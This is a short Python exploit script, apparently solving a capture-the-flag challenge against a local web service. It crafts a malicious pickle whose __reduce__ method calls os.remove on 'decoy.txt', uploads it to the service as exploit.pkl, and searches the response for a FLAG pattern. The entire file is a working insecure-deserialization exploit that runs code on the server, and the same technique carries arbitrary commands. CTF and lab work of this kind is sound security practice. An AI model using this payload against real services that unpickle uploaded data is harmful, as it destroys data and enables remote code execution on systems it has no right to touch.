import requests
import io
import pickle
import base64

base_url = "http://127.0.0.1:32942/"

print("=" * 80)
print("Crafting malicious pickle to delete decoy.txt")
print("=" * 80)

# Create a class that will execute os.remove('decoy.txt') upon unpickling
class DeleteDecoy:
    def __reduce__(self):
        import os
        return (os.remove, ('decoy.txt',))

# Generate the pickle
malicious_pickle = pickle.dumps(DeleteDecoy(), protocol=4)

print(f"\n[+] Malicious pickle generated")
print(f"[+] Length: {len(malicious_pickle)} bytes")
print(f"[+] Hex: {malicious_pickle.hex()}")
print(f"[+] Base64: {base64.b64encode(malicious_pickle).decode()}")

# Upload the malicious pickle
print("\n" + "=" * 80)
print("Uploading malicious pickle")
print("=" * 80)

files = {'pickle_file': ('exploit.pkl', io.BytesIO(malicious_pickle), 'application/octet-stream')}
response = requests.post(base_url, files=files, timeout=30)

print(f"\n[+] Status Code: {response.status_code}")
print(f"[+] Content-Type: {response.headers.get('Content-Type', 'Not specified')}")
print(f"[+] Content-Length: {len(response.text)} bytes")

print(f"\n[+] Response Body:")
print(response.text)

# Check if flag changed
if "this is just the decoy" in response.text:
    print("\n[!] Still showing decoy flag - decoy.txt was not deleted")
else:
    print("\n[!] FLAG MAY HAVE CHANGED!")
    # Look for flag pattern
    import re
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
    if flag_match:
        print(f"[!] Found flag: {flag_match.group()}")

print("\n" + "=" * 80)
print("Exploit attempt completed")
print("=" * 80)

